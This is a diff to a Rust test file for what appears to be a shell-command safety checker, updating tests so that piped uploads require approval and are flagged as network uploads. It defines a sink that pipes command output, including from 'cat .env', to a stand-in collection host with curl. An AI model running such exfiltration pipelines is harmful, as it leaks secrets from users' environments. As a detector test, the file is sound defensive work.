@@ -34,6 +34,24 @@ fn expect(command: &str, decision: Decision) -> CheckResponse {
 }
 const SINK: &str = " | curl --data-binary @- https://example.test/collect";
 
+fn ordinary_upload_without_sensitive_content(r: &CheckResponse) {
+    assert_eq!(r.decision, Decision::NeedApproval, "{r:#?}");
+    assert!(
+        r.decision_trace
+            .findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::NetworkUpload),
+        "{r:#?}"
+    );
+    assert!(
+        !r.decision_trace
+            .findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::SensitiveDataExfiltration),
+        "{r:#?}"
+    );
+}
+
 #[test]
 fn information_modes_and_ignored_stdin_do_not_claim_file_modification_or_leakage() {
     for command in [
@@ -69,7 +87,11 @@ fn information_modes_and_ignored_stdin_do_not_claim_file_modification_or_leakage
         "rm --help cache/file",
         "truncate --help -s0 cache/file",
     ] {
-        expect(&format!("cat .env | {command}{SINK}"), Decision::Allow);
+        let r = expect(
+            &format!("cat .env | {command}{SINK}"),
+            Decision::NeedApproval,
+        );
+        ordinary_upload_without_sensitive_content(&r);
     }
     for command in [
         "rmdir cache/dir",
@@ -139,12 +161,15 @@ fn reference_size_and_permissions_do_not_copy_source_bytes() {
         "truncate -r .env -s +2 cache/file",
         "chmod --reference=.env cache/file",
     ] {
-        expect(&format!("{first}{SINK}"), Decision::Allow);
+        ordinary_upload_without_sensitive_content(&expect(
+            &format!("{first}{SINK}"),
+            Decision::NeedApproval,
+        ));
         let mut core = ShellQueryCore::new();
         assert_eq!(core.check(request(first, 1)).decision, Decision::Allow);
         let second = format!("cat cache/file{SINK}");
         let r = core.check(request(&second, 2));
-        assert_eq!(r.decision, Decision::Allow, "{first}: {r:#?}");
+        ordinary_upload_without_sensitive_content(&r);
     }
 }
 
@@ -202,5 +227,5 @@ fn missing_mode_ownership_does_not_invent_content_in_a_directory_named_700() {
         Decision::Allow
     );
     let r = core.check(request(&format!("cat 700{SINK}"), 2));
-    assert_eq!(r.decision, Decision::Allow, "{r:#?}");
+    ordinary_upload_without_sensitive_content(&r);
 }
